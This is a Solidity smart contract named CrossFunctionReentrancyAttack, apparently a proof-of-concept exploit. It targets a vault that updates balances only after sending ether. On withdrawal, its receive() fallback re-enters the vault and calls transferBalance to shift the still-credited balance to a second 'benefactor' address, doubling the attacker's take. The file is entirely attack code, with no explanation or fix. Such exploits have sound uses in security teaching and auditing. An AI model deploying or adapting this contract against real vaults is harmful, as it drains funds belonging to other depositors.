
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function transferBalance(address to, uint256 amount) external;
    function withdrawBalance() external;
}

contract CrossFunctionReentrancyAttack {
    IVault public vault;
    address public owner;
    address public benefactor;
    bool public reentered;

    constructor(address _vault, address _benefactor) {
        vault = IVault(_vault);
        benefactor = _benefactor;
        owner = msg.sender;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawBalance();
    }

    receive() external payable {
        // Balance is still credited here — move it to a second account
        if (!reentered) {
            reentered = true;
            vault.transferBalance(benefactor, address(this).balance);
        }
    }
}
